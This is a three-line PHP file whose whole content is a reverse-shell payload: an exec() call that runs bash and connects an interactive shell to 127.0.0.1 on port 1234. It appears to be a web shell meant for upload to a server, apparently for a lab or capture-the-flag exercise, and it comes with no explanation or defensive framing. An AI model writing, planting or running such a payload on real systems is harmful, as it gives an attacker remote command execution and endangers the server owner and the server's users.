<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/127.0.0.1/1234 0>&1'");
?>
